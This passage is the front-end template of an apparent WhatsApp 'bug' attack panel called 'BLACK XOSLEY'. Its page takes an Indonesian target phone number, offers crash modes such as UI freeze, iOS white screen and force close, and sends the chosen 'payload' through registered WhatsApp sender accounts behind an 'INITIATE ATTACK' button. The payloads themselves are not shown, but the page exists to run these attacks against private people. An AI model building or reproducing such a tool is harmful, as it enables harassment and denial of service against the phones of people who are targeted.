            opacity: 0;
            transition: opacity 0.3s;
        }

        .mode-option:hover {
            transform: translateY(-4px);
            border-color: rgba(110, 231, 231, 0.4);
            box-shadow: 0 8px 25px rgba(74, 123, 255, 0.2);
        }

        .mode-option:hover::before {
            opacity: 1;
        }

        .mode-option.active {
            background: rgba(74, 123, 255, 0.2);
            border-color: var(--primary);
            box-shadow: 0 0 30px rgba(74, 123, 255, 0.3);
        }

        .mode-option.active::before {
            opacity: 1;
        }

        .mode-icon {
            font-size: 26px;
            margin-bottom: 12px;
            color: #8ab4ff;
            transition: 0.3s;
            position: relative;
            z-index: 1;
        }

        .mode-option.active .mode-icon {
            color: var(--secondary);
            transform: scale(1.15);
            filter: drop-shadow(0 0 8px rgba(110, 231, 231, 0.5));
        }

        .mode-name {
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 5px;
            color: #fff;
            position: relative;
            z-index: 1;
            letter-spacing: 0.5px;
        }

        .mode-desc {
            font-size: 11px;
            color: var(--text-muted);
            line-height: 1.4;
            position: relative;
            z-index: 1;
        }

        .btn-execute {
            width: 100%;
            background: linear-gradient(135deg, var(--primary), #3a6bff);
            color: white;
            border: none;
            padding: 20px;
            border-radius: 18px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 17px;
            letter-spacing: 1.2px;
            cursor: pointer;
            margin-top: 30px;
            position: relative;
            overflow: hidden;
            transition: all 0.3s;
            box-shadow: 0 8px 30px rgba(74, 123, 255, 0.4);
        }

        .btn-execute::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }

        .btn-execute:hover {
            transform: translateY(-3px);
            box-shadow: 0 12px 40px rgba(74, 123, 255, 0.5);
        }

        .btn-execute:hover::before {
            left: 100%;
        }

        .btn-execute:active {
            transform: scale(0.98);
        }

        .btn-execute:disabled {
            background: linear-gradient(135deg, #3a4b6d, #2a3b5d);
            cursor: not-allowed;
            box-shadow: none;
        }

        .btn-loading i {
            animation: spin 1s infinite linear;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }

        .status-pill {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(20, 40, 80, 0.5);
            border: 1px solid rgba(120, 180, 255, 0.2);
            padding: 10px 20px;
            border-radius: 30px;
            font-size: 13px;
            margin-right: 10px;
            backdrop-filter: blur(10px);
            transition: all 0.3s;
        }

        .status-pill:hover {
            border-color: rgba(110, 231, 231, 0.4);
            transform: translateY(-2px);
        }

        .dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #22d3a4;
            box-shadow: 0 0 15px #22d3a4;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        .dot.offline { 
            background: #ff6b8b; 
            box-shadow: 0 0 15px #ff6b8b;
            animation: pulseRed 1.5s infinite;
        }

        @keyframes pulseRed {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .navbar {
            position: fixed;
            bottom: 25px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(15, 25, 60, 0.9);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(120, 180, 255, 0.2);
            padding: 12px 35px;
            border-radius: 50px;
            display: flex;
            gap: 35px;
            z-index: 100;
            box-shadow: 0 15px 50px rgba(0, 10, 40, 0.6);
        }

        .nav-item {
            color: var(--text-muted);
            font-size: 22px;
            text-decoration: none;
            padding: 12px;
            border-radius: 50%;
            transition: all 0.3s;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 50px;
            height: 50px;
        }

        .nav-item.active {
            color: #fff;
            background: linear-gradient(135deg, var(--primary), #3a6bff);
            box-shadow: 0 0 25px rgba(74, 123, 255, 0.5);
            transform: translateY(-5px);
        }

        .nav-item:hover:not(.active) {
            color: var(--secondary);
            background: rgba(110, 231, 231, 0.1);
            transform: translateY(-3px);
        }

        #result-area {
            display: none;
            margin-top: 24px;
            border-top: 1px solid rgba(120, 180, 255, 0.15);
            padding-top: 24px;
        }
        
        .console-log {
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            color: #22d3a4;
            background: rgba(10, 20, 50, 0.6);
            padding: 20px;
            border-radius: 16px;
            border-left: 4px solid #22d3a4;
            line-height: 1.7;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(34, 211, 164, 0.2);
        }

        .error-log {
            color: #ff6b8b;
            border-left-color: #ff6b8b;
            border-color: rgba(255, 107, 139, 0.2);
        }

        .warning-message {
            background: rgba(255, 107, 139, 0.1);
            border: 1px solid rgba(255, 107, 139, 0.3);
            border-radius: 14px;
            padding: 18px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            gap: 12px;
            backdrop-filter: blur(10px);
        }

        .warning-message i {
            color: #ff6b8b;
            font-size: 20px;
            flex-shrink: 0;
        }

        .warning-text {
            font-size: 14px;
            color: #ffb0c0;
            line-height: 1.5;
        }

        .loading {
            display: none;
            text-align: center;
            margin: 25px 0;
        }

        .loading-spinner {
            display: inline-block;
            width: 45px;
            height: 45px;
            border: 3px solid rgba(74, 123, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--secondary);
            animation: spin 1s ease-in-out infinite;
            box-shadow: 0 0 20px rgba(110, 231, 231, 0.3);
        }

        .user-info-section {
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 22px;
            margin-bottom: 25px;
            box-shadow: 0 10px 30px rgba(0, 5, 30, 0.3);
        }

        .user-info-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 0;
            border-bottom: 1px solid rgba(120, 180, 255, 0.1);
        }

        .user-info-item:last-child {
            border-bottom: none;
        }

        .user-info-label {
            color: var(--text-muted);
            font-size: 14px;
            font-weight: 600;
        }

        .user-info-value {
            font-family: 'JetBrains Mono', monospace;
            font-size: 14px;
            color: #fff;
            font-weight: 500;
        }

        .expired-soon {
            color: #ffd166 !important;
            animation: glowWarning 2s infinite;
        }

        @keyframes glowWarning {
            0%, 100% { text-shadow: 0 0 5px rgba(255, 209, 102, 0.5); }
            50% { text-shadow: 0 0 15px rgba(255, 209, 102, 0.8); }
        }

        .expired-danger {
            color: #ff6b8b !important;
            animation: glowDanger 1.5s infinite;
        }

        @keyframes glowDanger {
            0%, 100% { text-shadow: 0 0 5px rgba(255, 107, 139, 0.5); }
            50% { text-shadow: 0 0 15px rgba(255, 107, 139, 0.8); }
        }
    </style>
</head>
<body>
    <div class="grid-bg"></div>

    <div class="container">
        <header>
            <div class="header-left">
                <h1>BLACK XOSLEY</h1>
                <p>System Execution</p>
            </div>
            <a href="/dashboard" class="profile-btn">
                <i class="fa-solid fa-arrow-left"></i>
            </a>
        </header>

        <div class="user-info-section">
            <div class="user-info-item">
                <span class="user-info-label">Username</span>
                <span class="user-info-value">${username || 'Guest'}</span>
            </div>
            <div class="user-info-item">
                <span class="user-info-label">Role</span>
                <span class="user-info-value">${userRole.toUpperCase()}</span>
            </div>
            <div class="user-info-item">
                <span class="user-info-label">Expired</span>
                <span class="user-info-value ${Date.now() > expired ? 'expired-danger' : (expired - Date.now() < 86400000 ? 'expired-soon' : '')}">
                    ${formattedTime}
                </span>
            </div>
        </div>

        <div style="margin-bottom: 25px; overflow-x: auto; white-space: nowrap; padding-bottom: 5px;">
            <div class="status-pill">
                <span class="dot" id="server-dot"></span>
                <span id="server-status">Server Online</span>
            </div>
            <div class="status-pill">
                <i class="fa-solid fa-clock" style="color: var(--secondary); font-size: 12px;"></i>
                <span id="clock">00:00:00</span>
            </div>
            <div class="status-pill">
                <i class="fa-solid fa-satellite-dish" style="color: var(--secondary); font-size: 12px;"></i>
                <span id="sender-count">0 Senders</span>
            </div>
        </div>

        <div class="glass-card">
            <div class="card-header">
                <i class="fa-solid fa-terminal"></i>
                <span class="card-title">Bug Executor</span>
            </div>

            <div class="input-group">
                <label class="input-label">TARGET NUMBER</label>
                <div class="input-wrapper">
                    <input type="tel" id="target" class="custom-input" placeholder="628xxxxxxxxxx" autocomplete="off" value="${detail.target || ''}">
                    <i class="fa-solid fa-crosshairs"></i>
                </div>
            </div>

            <div class="input-group">
                <label class="input-label">SELECT PAYLOAD</label>
                <div class="mode-grid">
                    <div class="mode-option" data-mode="delay">
                        <div class="mode-icon"><i class="fa-solid fa-stopwatch"></i></div>
                        <div class="mode-name">BUG DELAY</div>
                        <div class="mode-desc">Slowdown traffic packets</div>
                    </div>

                    <div class="mode-option" data-mode="blank">
                        <div class="mode-icon"><i class="fa-solid fa-square"></i></div>
                        <div class="mode-name">BUG BLANK</div>
                        <div class="mode-desc">Universal UI freeze</div>
                    </div>

                    <div class="mode-option" data-mode="medium">
                        <div class="mode-icon"><i class="fa-solid fa-bolt"></i></div>
                        <div class="mode-name">BUG MEDIUM</div>
                        <div class="mode-desc">Medium intensity effect</div>
                    </div>

                    <div class="mode-option" data-mode="iosblank">
                        <div class="mode-icon"><i class="fa-brands fa-apple"></i></div>
                        <div class="mode-name">iOS BLANK</div>
                        <div class="mode-desc">White screen freeze</div>
                    </div>

                    <div class="mode-option" data-mode="fcinvsios">
                        <div class="mode-icon"><i class="fa-solid fa-ghost"></i></div>
                        <div class="mode-name">iOS INVISIBLE</div>
                        <div class="mode-desc">Force close with invite</div>
                    </div>
                </div>
            </div>

            <div id="no-sender-warning" class="warning-message" style="display: none;">
                <i class="fa-solid fa-triangle-exclamation"></i>
                <div class="warning-text">
                    <strong>No active senders found!</strong><br>
                    Add WhatsApp senders first in "My Sender" menu to use this feature.
                </div>
            </div>

            <div class="loading" id="loading">
                <div class="loading-spinner"></div>
                <p style="margin-top: 12px; color: var(--text-muted);">Processing execution...</p>
            </div>

            <button class="btn-execute" id="execBtn">
                <i class="fa-solid fa-bolt"></i> INITIATE ATTACK
            </button>

            <div id="result-area">
                <div class="console-log" id="console-text">
                    ${message || 'Waiting for command...'}
                </div>
            </div>
        </div>
    </div>

    <nav class="navbar">
        <a href="/dashboard" class="nav-item">
            <i class="fa-solid fa-house"></i>
        </a>
        <a href="/execution" class="nav-item active">
            <i class="fa-solid fa-fingerprint"></i>
        </a>
        <a href="/mysender" class="nav-item">
            <i class="fa-solid fa-server"></i>
        </a>
    </nav>

    <script>
        let currentMode = '${mode}' || null;
        let userHasSender = false;
        let activeSendersCount = 0;

        document.addEventListener('DOMContentLoaded', function() {
            if (currentMode) {
                const modeElement = document.querySelector(\`.mode-option[data-mode="\${currentMode}"]\`);
                if (modeElement) {
                    selectMode(modeElement, currentMode);
                }
            }

            ${message ? `showResult('${status}', \`${message.replace(/'/g, "\\'")}\`);` : ''}

            updateClock();
            setInterval(updateClock, 1000);

            checkSenderStatus();
            setInterval(checkSenderStatus, 30000);

            const modeOptions = document.querySelectorAll('.mode-option');
            modeOptions.forEach(option => {
                option.addEventListener('click', function() {
                    const mode = this.getAttribute('data-mode');
                    selectMode(this, mode);
                });
            });

            const execBtn = document.getElementById('execBtn');
            execBtn.addEventListener('click', executeBug);

            const targetInput = document.getElementById('target');
            targetInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    executeBug();
                }
            });

            getUrlParams();
        });

        function updateClock() {
            const now = new Date();
            document.getElementById('clock').innerText = now.toLocaleTimeString('id-ID');
        }

        function selectMode(element, mode) {
            document.querySelectorAll('.mode-option').forEach(el => el.classList.remove('active'));
            element.classList.add('active');
            currentMode = mode;
        }

        function checkSenderStatus() {
            fetch('/api/mysenders')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        activeSendersCount = data.senders.length;
                        userHasSender = activeSendersCount > 0;
                        
                        document.getElementById('sender-count').textContent = \`\${activeSendersCount} Senders\`;
                        
                        const warningElement = document.getElementById('no-sender-warning');
                        const executeBtn = document.getElementById('execBtn');
                        
                        if (userHasSender) {
                            warningElement.style.display = 'none';
                            executeBtn.disabled = false;
                            document.getElementById('server-dot').className = 'dot';
                            document.getElementById('server-status').textContent = 'Server Online';
                        } else {
                            warningElement.style.display = 'flex';
                            executeBtn.disabled = true;
                            document.getElementById('server-dot').className = 'dot offline';
                            document.getElementById('server-status').textContent = 'No Senders';
                        }
                    }
                })
                .catch(error => {
                    console.error('Error checking sender status:', error);
                });
        }

        function executeBug() {
            const target = document.getElementById('target').value;
            const btn = document.getElementById('execBtn');
            const resultArea = document.getElementById('result-area');
            const consoleText = document.getElementById('console-text');

            if (!target) {
                showResult('error', '❌ Please enter target number!');
                return;
            }
            if (!currentMode) {
                showResult('error', '❌ Please select bug type first!');
                return;
            }
            if (!userHasSender) {
                showResult('error', '❌ No active senders available!');
                return;
            }

            const cleanNumber = target.replace(/\D/g, '');
            if (!cleanNumber.startsWith('62') || cleanNumber.length < 10) {
                showResult('error', '❌ Invalid number format! Must start with 62 and minimum 10 digits.');
                return;
            }

            btn.disabled = true;
            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> PROCESSING...';
            btn.classList.add('btn-loading');
            
            resultArea.style.display = 'block';
            consoleText.innerHTML = \`> Initializing connection to \${cleanNumber}...<br>> Loading payload: \${currentMode.toUpperCase()}<br>> Please wait...\`;

            fetch('/execution?target=' + encodeURIComponent(cleanNumber) + '&mode=' + encodeURIComponent(currentMode), {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                }
            })
            .then(response => response.text())
            .then(html => {
                btn.disabled = false;
                btn.innerHTML = '<i class="fa-solid fa-bolt"></i> INITIATE ATTACK';
                btn.classList.remove('btn-loading');

                showResult('success', 
                    \`✅ <strong>Execution Successful!</strong><br><br>
                    <strong>Target:</strong> \${cleanNumber}<br>
                    <strong>Payload:</strong> \${currentMode.toUpperCase()}<br>
                    <strong>Senders:</strong> \${activeSendersCount} active<br>
                    <strong>Status:</strong> Bug successfully sent<br>
                    <strong>ETA:</strong> Effects visible in 1-5 minutes\`
                );
            })
            .catch(error => {
                btn.disabled = false;
                btn.innerHTML = '<i class="fa-solid fa-bolt"></i> INITIATE ATTACK';
                btn.classList.remove('btn-loading');

                showResult('error', 
                    \`❌ <strong>Execution Failed!</strong><br><br>
                    <strong>Target:</strong> \${cleanNumber}<br>
                    <strong>Payload:</strong> \${currentMode.toUpperCase()}<br>
                    <strong>Error:</strong> Failed to connect to WhatsApp sender<br>
                    <strong>Suggest:</strong> Check sender connection and try again\`
                );
            });
        }

        function showResult(type, message) {
            const consoleText = document.getElementById('console-text');
            const resultArea = document.getElementById('result-area');
            
            consoleText.innerHTML = message;
            consoleText.className = type === 'error' ? 'console-log error-log' : 'console-log';
            
            resultArea.style.display = 'block';
            resultArea.scrollIntoView({ behavior: 'smooth' });
        }

        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            const mode = params.get('mode');
            const target = params.get('target');
            
            if (mode) {
                const modeElement = document.querySelector(\`.mode-option[data-mode="\${mode}"]\`);
                if (modeElement) {
                    selectMode(modeElement, mode);
                }
            }
            
            if (target) {
                document.getElementById('target').value = target;
            }
        }
    </script>
</body>
</html>
 `;
};